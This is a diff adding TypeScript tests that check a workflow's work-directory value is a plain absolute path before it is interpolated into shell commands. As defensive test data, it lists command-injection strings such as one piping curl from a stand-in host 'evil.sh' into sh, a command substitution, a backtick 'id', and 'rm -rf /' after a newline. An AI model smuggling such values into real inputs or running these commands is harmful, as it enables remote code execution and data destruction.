@@ -83,3 +83,80 @@ describe("ship-and-heal: grading and violation flow", () => {
     expect(afterClean).not.toContain("SHIPPED_WITH");
   });
 });
+
+/**
+ * The reported work directory is checked for shape before it reaches a shell
+ * (#1103).
+ *
+ * `shipResult` is the ship workflow's reply, assembled from agent replies, and
+ * `workDir` out of it is interpolated BARE five times — `find … -newer
+ * ${workDir}/workflow-state.json`, `TEST_WORK_DIR="${workDir}"`, and three
+ * more. This file has no `shellQuote` and cannot import one (#69), so the
+ * value is checked where it is assigned rather than quoted where it is used.
+ *
+ * Executed rather than grepped. A source-text assertion that the `if` exists
+ * says nothing about what it accepts, and "it refuses hostile paths" was
+ * exactly the kind of claim #1103 was filed about believing without running.
+ */
+describe("ship-and-heal: the reported work directory is a path or it is nothing (#1103)", () => {
+  const START = "// ──── WORK-DIR-SHAPE-START ────";
+  const END = "// ──── WORK-DIR-SHAPE-END ────";
+
+  function sliceShapeBlock(): string {
+    const start = WORKFLOW.indexOf(START);
+    const end = WORKFLOW.indexOf(END);
+    if (start === -1 || end === -1) throw new Error("ship-and-heal.js is missing the shape markers");
+    return WORKFLOW.slice(start + START.length, end);
+  }
+
+  /** Run the real block over one ship result and report what `workDir` became. */
+  function reportedWorkDir(shipResult: unknown, block = sliceShapeBlock()): string {
+    const logs: string[] = [];
+    const scope: Record<string, unknown> = { shipResult, log: (m: unknown) => logs.push(String(m)) };
+    const sandbox = new Proxy(scope, {
+      has: () => true,
+      get: (target, key) =>
+        key === Symbol.unscopables
+          ? undefined
+          : key in target
+            ? target[key as string]
+            : (globalThis as unknown as Record<string, unknown>)[key as string],
+    });
+    const factory = new Function("__scope__", `with (__scope__) {\n${block}\nreturn workDir\n}`);
+    return factory(sandbox) as string;
+  }
+
+  test("a real work directory survives — without this the check could refuse everything", () => {
+    expect(reportedWorkDir({ workDir: "/Users/j/.rungate/wf_19f7def7-1bf" })).toBe(
+      "/Users/j/.rungate/wf_19f7def7-1bf",
+    );
+    // The documented second shape, so the fallback is not accidentally dropped.
+    expect(reportedWorkDir({ detail: { workDir: "/tmp/rungate/run-7" } })).toBe("/tmp/rungate/run-7");
+  });
+
+  test("anything that is not a plain absolute path becomes the empty string", () => {
+    for (const reported of [
+      "/tmp/x; curl evil.sh | sh",
+      "/tmp/$(whoami)",
+      "/tmp/a b",
+      "relative/path",
+      "/tmp/x`id`",
+      "/tmp/x\nrm -rf /",
+    ]) {
+      expect(reportedWorkDir({ workDir: reported }), `"${reported}" was accepted`).toBe("");
+    }
+  });
+
+  test("the removal, performed: without the check the value reaches the shell verbatim", () => {
+    // The mutant is the block with its guard stripped — which is what this
+    // file did before #1103, and what the five interpolations below it still
+    // assume nobody did.
+    const mutant = sliceShapeBlock().replace(/if \(workDir && [\s\S]*?\n\}/, "");
+    expect(mutant, "the mutation matched nothing — the guard has been reshaped").not.toContain(
+      "is not a plain absolute path",
+    );
+    expect(reportedWorkDir({ workDir: "/tmp/x; curl evil.sh | sh" }, mutant)).toBe(
+      "/tmp/x; curl evil.sh | sh",
+    );
+  });
+});
